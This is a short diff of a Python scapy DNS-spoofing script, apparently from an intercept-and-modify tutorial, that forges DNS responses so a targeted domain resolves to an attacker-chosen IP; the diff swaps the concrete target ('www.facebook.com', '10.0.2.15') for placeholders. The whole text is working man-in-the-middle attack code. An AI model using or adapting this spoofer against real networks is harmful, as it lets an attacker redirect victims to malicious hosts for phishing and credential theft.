@@ -7,9 +7,9 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         name = scapy_packet[scapy.DNSQR].qname
-        if "www.facebook.com" in name:
+        if "domain name ." in name:
             print("[+]spoofing target")
-            answer = scapy.DNSRR(rrname=name, rdata="10.0.2.15")
+            answer = scapy.DNSRR(rrname=name, rdata="your IP")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
